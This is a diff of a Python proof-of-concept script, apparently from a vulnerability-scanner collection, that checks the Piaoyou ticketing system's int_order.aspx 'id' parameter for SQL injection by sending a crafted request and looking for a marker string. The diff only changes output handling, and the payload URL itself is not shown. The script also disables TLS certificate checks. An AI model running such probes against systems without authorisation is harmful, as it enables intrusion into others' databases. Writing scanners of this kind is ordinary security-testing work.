@@ -8,8 +8,8 @@ description: 文件tickets/int_order.aspx中,参数id存在SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class piaoyou_int_order_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class piaoyou_int_order_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
-                cprint("[+]存在票友票务系统int_order.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在票友票务系统int_order.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = piaoyou_int_order_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
